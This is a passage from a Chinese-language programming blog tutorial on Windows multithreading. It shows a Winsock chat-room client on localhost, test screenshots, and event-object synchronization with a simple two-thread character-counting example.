&amp;len);</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用线程处理客户端</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line">clnSocks[clntCnt++] = sockConn;<span class="comment">//clntCnt++ 右边自增，效果一样</span></span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line"></span><br><span class="line">hThread = (HWND)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, HandleCln, (<span class="type">void</span> *)&amp;sockConn, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Connect Num = %d, client ip: %s\n&quot;</span>,clntCnt, <span class="built_in">inet_ntoa</span>(addrCli.sin_addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>常用的框架就很自然的copy</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端要做的事情</p><ol><li>请求连接上线，发送给客户端</li><li>等待服务端消息</li><li>等待用户自己下线消息</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME_SIZE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szName[NAME_SIZE] = <span class="string">&quot;[DEFAULT]&quot;</span>;<span class="comment">//默认客户端的昵称</span></span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE];<span class="comment">//收发用的buffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;必须以命令行启动,且输入两个参数,包括昵称!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;例如:  MyThreadClient.exe name&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">SOCKET hSock;</span><br><span class="line">SOCKADDR_IN serAdr;</span><br><span class="line">HANDLE hSendThread;<span class="comment">//接受线程</span></span><br><span class="line">HANDLE hRecvThread;<span class="comment">//发送线程</span></span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serAdr, <span class="number">0</span>, <span class="built_in">sizeof</span>(serAdr));</span><br><span class="line">serAdr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">serAdr.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">serAdr.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大部分都是照搬的，在客户端的使用上，用了之前main自带的参数做了命令行启动的效果。</p><p><strong>完整的客户端</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME_SIZE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szName[NAME_SIZE] = <span class="string">&quot;[DEFAULT]&quot;</span>;<span class="comment">//默认客户端的昵称</span></span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE];<span class="comment">//收发用的buffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">SendMsg</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET *)arg);</span><br><span class="line"><span class="type">char</span> szNameMsg[NAME_SIZE + MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;<span class="comment">//需要昵称和消息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">memset</span>(szMsg, <span class="number">0</span>, MAX_BUF_SIZE);</span><br><span class="line"><span class="comment">//等待客户端在控制台输入的消息</span></span><br><span class="line"><span class="built_in">fgets</span>(szMsg, MAX_BUF_SIZE, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理客户端主动下线</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szMsg, <span class="string">&quot;Q\n&quot;</span>) || !<span class="built_in">strcmp</span>(szMsg, <span class="string">&quot;q\n&quot;</span>))&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取到消息后发送给服务器</span></span><br><span class="line"><span class="built_in">sprintf</span>(szNameMsg, <span class="string">&quot;%s %s&quot;</span>, szName, szMsg);</span><br><span class="line"><span class="built_in">send</span>(hClntSock, szNameMsg, <span class="built_in">strlen</span>(szNameMsg), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">RecvMsg</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET *)arg);</span><br><span class="line"><span class="type">char</span> szNameMsg[NAME_SIZE + MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;<span class="comment">//需要昵称和消息</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">memset</span>(szNameMsg, <span class="number">0</span>, NAME_SIZE + MAX_BUF_SIZE);</span><br><span class="line"><span class="comment">//等待来自客户端的消息</span></span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szNameMsg, <span class="built_in">sizeof</span>(szNameMsg), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果服务端断开</span></span><br><span class="line"><span class="keyword">if</span> (iLen == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">szNameMsg[iLen] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">fputs</span>(szNameMsg, stdout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;必须以命令行启动,且输入两个参数,包括昵称!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;例如:  MyThreadClient.exe name&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(szName, <span class="string">&quot;[%s]:&quot;</span>, argv[<span class="number">1</span>]);<span class="comment">//根据命令行输入的参数初始化name</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">SOCKADDR_IN serAdr;</span><br><span class="line">HANDLE hSendThread;<span class="comment">//接受线程</span></span><br><span class="line">HANDLE hRecvThread;<span class="comment">//发送线程</span></span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serAdr, <span class="number">0</span>, <span class="built_in">sizeof</span>(serAdr));</span><br><span class="line">serAdr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">serAdr.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">serAdr.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(sockSer, (SOCKADDR *)&amp;serAdr, <span class="built_in">sizeof</span>(serAdr)) == SOCKET_ERROR)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;connect error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给服务端发送消息，启用线程安排</span></span><br><span class="line">hSendThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, SendMsg, (<span class="type">void</span> *)&amp;sockSer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//接收服务端的消息</span></span><br><span class="line">hRecvThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, RecvMsg, (<span class="type">void</span> *)&amp;sockSer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待内核对象执行完毕</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hSendThread, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRecvThread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSer);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>老样子先跑服务端在跑客户端</p><img src="/2022/07/18/thread/014.png" class=""><p>ok，成功启用，没啥问题。本地回环的设置是这样。</p><p>然后多启动一个，也能跑出来。</p><img src="/2022/07/18/thread/015.png" class=""><p>然后客户端发消息给服务器</p><img src="/2022/07/18/thread/016.png" class=""><p>服务器接收到之后转发，可以看到客户端同样是接收到了先前发送的消息</p><p>再开一台</p><img src="/2022/07/18/thread/017.png" class=""><p>实际效果都差不多，就是达到一个简易版的聊天室。</p><img src="/2022/07/18/thread/018.png" class=""><p>关闭其中一台会看到连接数少了。</p><p>然后用我们之前写的方法，输入的q或者Q同样代表退出</p><img src="/2022/07/18/thread/019.png" class=""><img src="/2022/07/18/thread/020.png" class=""><p>效果都是没问题的。</p><blockquote><p>值得一提的是，也是小缺点，就是客户端发送的消息，服务器广播会又发下来，简单来说就是客户端a发的消息，会被服务器广播，然后客户a又收到了自己发的消息。</p></blockquote><hr><h2 id="线程同步-事件对象"><a href="#线程同步-事件对象" class="headerlink" title="线程同步-事件对象"></a>线程同步-事件对象</h2><p>前面整过互斥对象了，用<code>CreatrMutex</code>创建对象，作用就是变相的上锁，让线程操作内存的时候有序的进行。</p><p>而事件对象也属于内核对象，它有三个成员</p><ol><li>使用计数</li><li>用于指明事件是一个自动重置的事件还是一个人工重置的事件，用布尔值表示</li><li>用于指明该事件处于已通知状态还是未通知状态，同用布尔值表示</li></ol><p>事件对象的两种类型</p><ol><li>人工重置的事件对象</li><li>自动重置的事件对象</li></ol><p>事件对象的方法</p><ol><li>创建-调用<code>CreateEvent</code>函数创建或者打开一个命名的或者匿名的事件对象</li><li>设置状态-调用<code>SetEvent</code>函数把指定的事件对象设置为有信号状态</li><li>重置状态-调用<code>ResetEvent</code>函数把指定的事件对象设置为无信号状态</li><li>请求事件对象-调用<code>WaitForSingleObject</code>函数请求事件对象</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateEventW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,<span class="comment">//安全属性默认都NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bManualReset,<span class="comment">//复位方式 TRUE 必须用ResetEvent复原，FALSE自动还原无信号状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInitialState,<span class="comment">//初始状态 TRUE初始状态为有信号状态 FALSE无信号状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpName<span class="comment">//对象名称 NULL 无名的事件对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateEvent  CreateEventW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateEvent  CreateEventA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>反正这些要么在编译器里转到定义，要么上文档翻译一下看看大致作用。</p><hr><p>用线程去统计字符串</p><ol><li>一个统计字符串含A</li><li>一个统计非A</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>];<span class="comment">//字符串</span></span><br><span class="line">HANDLE hEvent;<span class="comment">//句柄</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Pleas Input string:\n&quot;</span>,stdout);</span><br><span class="line"><span class="built_in">fgets</span>(str, <span class="number">100</span>, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自动重置的事件，初始值为无信号状态</span></span><br><span class="line"><span class="comment">//hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//两个线程分别统计A和其它成员个数</span></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfOthers, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/021.png" class=""><p>统计也没问题，其它字符串看似多一个，是因为统计了字符串末尾的0。</p><p>如果不想输出这个末尾的0，就改一下就行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 